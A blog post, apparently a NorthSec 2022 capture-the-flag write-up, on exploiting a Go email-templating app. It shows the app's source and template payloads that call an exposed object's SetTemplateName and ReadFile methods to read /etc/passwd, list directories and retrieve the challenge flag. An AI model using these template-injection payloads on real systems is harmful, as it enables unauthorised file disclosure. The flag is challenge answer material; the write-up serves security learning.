---
layout: post
title: NorthSec 2022 Writeup - Marketing Email Template
date: 2022-05-23
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2022/05/NorthSec/MarketingEmailTemplate
---

```
Howdy, Lauren Chow asked me to send you our email templating application for you to test. The application is used for sending marketing emails from the CEO Anatoli Boon.

I’m available to you if you find any security issue. Also, it’s still in a dev state and will be released as is if you find nothing. Hopefully you won’t!

http://dev.email-template.ctf 3

IMPORTANT NOTE:

If you ever break the challenge, you can reset it via http://dev.email-template.ctf/reset.
DO NOT spam the /reset functionality or you will break it for a while.
Wait until the /reset redirects you, or at least 5 seconds, before you go back to the challenge page.
```

In this challenge, we were given a site where we could enter a template for sending emails. The site had a big text field to enter a template. And buttons to save and preview the template. 

![Marketing Email Template Site](/assets/images/2022/05/NorthSec/MarketingEmailTemplate/Site.png "Marketing Email Template Site")

The source code of the application was also provided. 

```go
package main

import (
    "os"
    "log"
    "fmt"
    "path"
    "errors"
    "strings"

    "net/http"
    "io/ioutil"
    "html/template"

    "github.com/gin-gonic/gin"
)

type Update struct {
    Template string `json:"template" binding:"required"`
}

type MyApp struct {
    templateName string
}

func (m *MyApp) ReadFile() ([]byte, error) {
    f, err := os.Open(m.templateName)

    if err != nil {
        files, e := ioutil.ReadDir(path.Dir(m.templateName))
        
        if e != nil {
            return []byte{}, e
        }

        var filenames []string
        for _, file := range files {
            var filename string = file.Name()
            if file.IsDir() {
                filename += " (directory)"
            }
            filenames = append(filenames, filename)
        }

        return []byte(fmt.Sprint(err) + "\nPossible files:\n" + strings.Join(filenames[:], "\n")), nil
    }

    defer func() {
        if err = f.Close(); err != nil {
            log.Fatal(err)
        }
    }()
    
    return ioutil.ReadAll(f)
}

func (m *MyApp) SetTemplateName(name string) error {
    if name == "" {
        return errors.New("TemplateName cannot be nil or empty.")
    }

    m.templateName = name
    return nil
}

func main() {
    r := gin.Default()
    r.LoadHTMLGlob("templates/*")
    r.Static("/assets", "./assets")

    r.GET("/", func(c *gin.Context) {
        m := MyApp{"templates/index.html"}
        content, err := m.ReadFile()

        if err != nil { 
            log.Fatal(err) 
        }

        m.SetTemplateName("templates/preview.html")
        preview, err := m.ReadFile()
        
        if err != nil { 
            log.Fatal(err) 
        }

        tmpl, err := template.New("").Parse(string(content))
        
        if err != nil { 
            log.Fatal(err) 
        }
        
        c.Status(http.StatusOK)
        err = tmpl.Execute(c.Writer, gin.H{"title":"Test!","template":string(preview),"m":&m})
        
        if err != nil { 
            log.Fatal(err) 
        }
    })

    r.POST("/update", func(c *gin.Context) {
        var update Update
        var err error

        err = c.BindJSON(&update)

        if err != nil {
            log.Fatal(err)
        }

        f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)

        if err != nil {
            log.Fatal(err)
        }

        defer f.Close()

        if _, err = f.WriteString(update.Template); err != nil {
            log.Fatal(err)
        }

        c.JSON(200, "ok")
    })

    r.Any("/preview", func(c *gin.Context) {
        m := MyApp{"templates/preview.html"}

        var title string
        if title = c.Query("title"); c.Query("title") == "" {
            title = "Test Email"
        }
        
        var eventname string
        if eventname = c.Query("eventname"); c.Query("eventname") == "" {
            eventname = "My-Event-Name"
        }
        
        var firstname string
        if firstname = c.Query("firstname"); c.Query("firstname") == "" {
            firstname = "John"
        }
        
        var lastname string
        if lastname = c.Query("lastname"); c.Query("lastname") == "" {
            lastname = "Smith"
        }
        
        var companyname string
        if companyname = c.Query("companyname"); c.Query("companyname") == "" {
            companyname = "Email Templating Inc."
        }
        
        // Fetch all custom tags
        var num string
        var stop bool = false
        var custom string
        var customs = map[string]string{}
        for i := 1; !stop; i++ {
            num = "custom"+string(i+48)
            custom = c.Query(num)

            if custom == ""{
                stop = true
                break
            }
            customs[num] = custom
        }

        // Create the response map
        var response map[string]interface{} = gin.H{
                "title":title,
                "eventname":eventname,
                "firstname":firstname,
                "lastname":lastname,
                "companyname":companyname,
                "m":&m,
            }

        // Merge the custom tags
        for key, value := range customs {
            response[key] = value
        }

        content, err := m.ReadFile()

        if err != nil { 
            log.Fatal(err) 
        }

        tmpl, err := template.New("").Parse(string(content))

        if err != nil { 
            log.Fatal(err) 
        }

        c.Status(http.StatusOK)
        err = tmpl.Execute(c.Writer, response)
        
        if err != nil { 
            log.Fatal(err) 
        }
    })

    r.Run("127.0.0.1:8000")
}
```

The application was written in Go, and used the [Gin Web Framework](https://gin-gonic.com/). 

I did some research, and I found out that the templating engine could be used to access anything passed to the second parameter of the `Execute` method. In this code, it's the response object that contains the custom tags passed in the query string, some placeholders, and `m`, an instance of MyApp.

```go
var response map[string]interface{} = gin.H{
        "title":title,
        "eventname":eventname,
        "firstname":firstname,
        "lastname":lastname,
        "companyname":companyname,
        "m":&m,
    }
```

The MyApp class was used to load the template from file before passing it to the templating engine. It had two methods. `ReadFile` would read the template from the server. And `SetTemplateName` would set the file that contains the template to read. 

Since the MyApp instance was passed to `Execute`, I could access it from the template by using `{% raw %}{{ .m }}{% endraw %}`. From there I could access any properties and methods of the object. 

I tried reading `/etc/passwd` first. 

```go
<p>Hey {% raw %}{{ .m.SetTemplateName "/etc/passwd" }}{% endraw %},</p>
<p>Hey {% raw %}{{ .m.ReadFile }}{% endraw %},</p>
```

Which gave me the file content in ASCII. 
```
Hey [114 111 111 116 58 120 58 48 58 48 58 114 111 111 116 58 47 114 111 111 116 58 47 98 105 110 47 98 97 115 104 10 100 97 101 109 111 110 58 120 58 49 58 49 58 100 97 101 109 111 110 58 47 117 115 114 47 115 98 105 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 98 105 110 58 120 58 50 58 50 58 98 105 110 58 47 98 105 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 115 58 120 58 51 58 51 58 115 121 115 58 47 100 101 118 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 110 99 58 120 58 52 58 54 53 53 51 52 58 115 121 110 99 58 47 98 105 110 58 47 98 105 110 47 115 121 110 99 10 103 97 109 101 115 58 120 58 53 58 54 48 58 103 97 109 101 115 58 47 117 115 114 47 103 97 109 101 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 109 97 110 58 120 58 54 58 49 50 58 109 97 110 58 47 118 97 114 47 99 97 99 104 101 47 109 97 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 108 112 58 120 58 55 58 55 58 108 112 58 47 118 97 114 47 115 112 111 111 108 47 108 112 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 109 97 105 108 58 120 58 56 58 56 58 109 97 105 108 58 47 118 97 114 47 109 97 105 108 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 110 101 119 115 58 120 58 57 58 57 58 110 101 119 115 58 47 118 97 114 47 115 112 111 111 108 47 110 101 119 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 117 117 99 112 58 120 58 49 48 58 49 48 58 117 117 99 112 58 47 118 97 114 47 115 112 111 111 108 47 117 117 99 112 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 112 114 111 120 121 58 120 58 49 51 58 49 51 58 112 114 111 120 121 58 47 98 105 110 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 119 119 119 45 100 97 116 97 58 120 58 51 51 58 51 51 58 119 119 119 45 100 97 116 97 58 47 118 97 114 47 119 119 119 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 98 97 99 107 117 112 58 120 58 51 52 58 51 52 58 98 97 99 107 117 112 58 47 118 97 114 47 98 97 99 107 117 112 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 108 105 115 116 58 120 58 51 56 58 51 56 58 77 97 105 108 105 110 103 32 76 105 115 116 32 77 97 110 97 103 101 114 58 47 118 97 114 47 108 105 115 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 105 114 99 58 120 58 51 57 58 51 57 58 105 114 99 100 58 47 118 97 114 47 114 117 110 47 105 114 99 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 103 110 97 116 115 58 120 58 52 49 58 52 49 58 71 110 97 116 115 32 66 117 103 45 82 101 112 111 114 116 105 110 103 32 83 121 115 116 101 109 32 40 97 100 109 105 110 41 58 47 118 97 114 47 108 105 98 47 103 110 97 116 115 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 110 111 98 111 100 121 58 120 58 54 53 53 51 52 58 54 53 53 51 52 58 110 111 98 111 100 121 58 47 110 111 110 101 120 105 115 116 101 110 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 115 116 101 109 100 45 110 101 116 119 111 114 107 58 120 58 49 48 48 58 49 48 50 58 115 121 115 116 101 109 100 32 78 101 116 119 111 114 107 32 77 97 110 97 103 101 109 101 110 116 44 44 44 58 47 114 117 110 47 115 121 115 116 101 109 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 115 116 101 109 100 45 114 101 115 111 108 118 101 58 120 58 49 48 49 58 49 48 51 58 115 121 115 116 101 109 100 32 82 101 115 111 108 118 101 114 44 44 44 58 47 114 117 110 47 115 121 115 116 101 109 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 115 116 101 109 100 45 116 105 109 101 115 121 110 99 58 120 58 49 48 50 58 49 48 52 58 115 121 115 116 101 109 100 32 84 105 109 101 32 83 121 110 99 104 114 111 110 105 122 97 116 105 111 110 44 44 44 58 47 114 117 110 47 115 121 115 116 101 109 100 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 109 101 115 115 97 103 101 98 117 115 58 120 58 49 48 51 58 49 48 54 58 58 47 110 111 110 101 120 105 115 116 101 110 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 115 121 115 108 111 103 58 120 58 49 48 52 58 49 49 48 58 58 47 104 111 109 101 47 115 121 115 108 111 103 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 95 97 112 116 58 120 58 49 48 53 58 54 53 53 51 52 58 58 47 110 111 110 101 120 105 115 116 101 110 116 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10 117 98 117 110 116 117 58 120 58 49 48 48 48 58 49 48 48 48 58 58 47 104 111 109 101 47 117 98 117 110 116 117 58 47 98 105 110 47 98 97 115 104 10 115 121 115 116 101 109 100 45 99 111 114 101 100 117 109 112 58 120 58 57 57 57 58 57 57 57 58 115 121 115 116 101 109 100 32 67 111 114 101 32 68 117 109 112 101 114 58 47 58 47 117 115 114 47 115 98 105 110 47 110 111 108 111 103 105 110 10],
```
I used [From Binary in CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)) to decode it. 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

The next step was to find the flag on the server. luckily, when you tried to read a file that did not exist, the code would list the files. 

I tried to see if the flag was in `/flag`. 
```
<p>Hey {% raw %}{{ .m.SetTemplateName "/flag" }}{% endraw %},</p>
<p>Hey {% raw %}{{ .m.ReadFile }}{% endraw %},</p>
```

And got the listing of the root folder. 

```
open /flag: no such file or directory
Possible files:
app (directory)
app.bk (directory)
bin
boot (directory)
dev (directory)
etc (directory)
home (directory)
lib
lib32
lib64
libx32
media (directory)
mnt (directory)
opt (directory)
proc (directory)
root (directory)
run (directory)
sbin
srv (directory)
sys (directory)
tmp (directory)
usr (directory)
var (directory)
```

I used that to list the content of the `app` folder. 

```
<p>Hey {% raw %}{{ .m.SetTemplateName "/app/aaaa" }}{% endraw %},</p>
<p>Hey {% raw %}{{ .m.ReadFile }}{% endraw %},</p>
```

It showed a `flag` file. 

```
open /app/aaaa: no such file or directory
Possible files:
assets (directory)
flag
go.mod
go.sum
main.go
templates (directory)
```

I could then read this file. 
```
<p>Hey {% raw %}{{ .m.SetTemplateName "/app/flag" }}{% endraw %},</p>
<p>Hey {% raw %}{{ .m.ReadFile }}{% endraw %},</p>
```

To get the flag.
```
FLAG-6f040fad14bea1df66d07d8ccc109924
```

I submitted the flag and found out that there were two more flags in that track. 

```bash
$ askgod submit FLAG-6f040fad14bea1df66d07d8ccc109924                                     
Congratulations, you score your team 2 points!
Message: I just sent you a new message! (1/3)
```

I spent many hours trying to get the second flag. But I did not solve it. I hope this track will end up on [RingZero](https://ringzer0ctf.com/) so I can play with it more. It was frustrating but fun. 